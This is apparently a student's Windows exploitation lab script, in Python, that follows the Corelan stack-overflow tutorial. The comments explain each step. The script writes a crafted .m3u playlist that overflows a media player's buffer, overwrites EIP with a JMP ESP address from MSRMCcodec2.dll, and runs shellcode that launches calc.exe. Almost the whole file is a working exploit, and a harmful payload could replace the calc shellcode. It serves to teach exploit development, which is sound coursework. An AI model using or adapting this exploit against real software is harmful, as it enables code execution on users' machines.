# CS 373 Lab 2 Windows Exploitation
# Alex Young
# 7/18/2021

# This lab was done following the tutorial at https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
# The main difference is that I use python instead of perl and the Immunity Debugger with mona. The comments document the steps I took.
def main():
	out = open('exploit.m3u','w')	# using filename exploit.m3u
	
	# The first step is to find where the eip register is at the crash.
    # I use this to change the buffer size to write directly into the EIP.
    # This offset is found using the mona pattern offset command.
	# found jB7j (eip = 0x6a37426a --> ascii) at position 1072 using mona's pattern_offset (!mona pattern_create 5000 and !mona pattern_offset j7Bj 5000)
	write_string = "\x41" * 26072	# creating a string 26072 'A's long (started with 10000 and incremented using immunity debugger to find eip at 25000 + 1072)
	
	# Next I find that there is space for shellcode 5 characters after the EIP, which is where the ESP points
	# Now I need to find a way to jump to the shellcode (at ESP)
    # This can be done by having the EIP run JMP ESP - in order to do this I need to find an address in memory with this command
	eip = "\x2a\xb2\xaf\x01"		# Searched ff e4 binary string in MSRMCcodec2.dll dump to find address 0x01AFB22A containing JMP ESP instruction
	preshell = "\x90" * 25			# 25 NOPs before shellcode
	
	# shellcode taken from lab tutorial site, this will pop calc.exe
	shellcode = "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca"
	
	# write out the string and close the file
	out.write(write_string + eip + preshell + shellcode)
	out.close()

	
if __name__ == '__main__':
	main()